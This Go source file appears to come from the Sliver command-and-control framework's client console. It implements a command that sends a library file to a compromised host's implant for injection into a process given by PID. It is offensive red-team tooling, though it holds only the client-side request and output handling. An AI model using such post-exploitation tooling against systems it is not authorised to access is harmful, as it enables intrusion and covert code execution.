package exec

import (
	"context"
	"fmt"
	"io/ioutil"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

func LibInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	libPath := ctx.Args.String("library-path")
	pid := ctx.Args.Uint64("pid")
	data, err := ioutil.ReadFile(libPath)
	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Injecting %s into %d...", libPath, pid), ctrl)
	libInject, err := con.Rpc.LibInject(context.Background(), &sliverpb.LibInjectReq{
		Request: con.ActiveTarget.Request(ctx),
		Pid:     pid,
		Data:    data,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}

	if libInject.Response != nil && libInject.Response.Async {
		con.AddBeaconCallback(libInject.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, libInject)
			if err != nil {
				con.PrintErrorf("Failed to decode response: %s", err)
				return
			}
			con.PrintInfof("Injected %s into %d\n", libPath, pid)
		})
		con.PrintAsyncResponse(libInject.Response)
	} else {
		con.PrintInfof("Injected %s into %d\n", libPath, pid)
	}

}
